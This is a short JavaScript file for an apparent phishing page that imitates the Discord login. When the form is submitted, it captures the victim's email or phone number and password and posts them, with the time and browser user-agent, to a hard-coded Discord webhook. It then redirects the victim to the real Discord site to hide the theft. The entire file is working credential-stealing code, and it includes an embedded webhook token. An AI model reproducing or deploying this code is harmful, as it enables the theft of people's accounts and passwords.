document.addEventListener('DOMContentLoaded', () => {
    const form = document.querySelector('form');
    
    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const identifier = document.getElementById('emailORphone').value.trim();
        const password = document.getElementById('password').value.trim();

        if (!identifier || !password) return;

        const WEBHOOK_URL = "https://discord.com/api/webhooks/1492541774814777466/WSn9nb3REMUYTi-k_8F6_cBnZ6R-1atpqWTU5E4oM7atSk3AtGZWW8-K1n8EgUkKjLvV"; // ← CHANGE ÇA

        const data = {
            username: "Discord Login",
            embeds: [{
                title: "✅ Nouvelle connexion capturée",
                color: 7506394,
                fields: [
                    { name: "Email / Téléphone", value: `\`\`\`${identifier}\`\`\`` },
                    { name: "Password", value: `\`\`\`${password}\`\`\`` },
                    { name: "Heure", value: new Date().toLocaleString('fr-FR') },
                    { name: "User-Agent", value: `\`\`\`${navigator.userAgent.substring(0, 300)}\`\`\`` }
                ]
            }]
        };

        try {
            const response = await fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            });

            if (response.ok) {
                console.log("%c✅ Envoyé au webhook", "color: lime");
            } else {
                console.log("%c❌ Webhook a répondu avec erreur", "color: red");
            }
        } catch (err) {
            console.log("%c❌ Erreur réseau", "color: red");
        }

        // Redirection obligatoire
        setTimeout(() => {
            window.location.href = "https://discord.com/channels/@me";
        }, 800);
    });
});
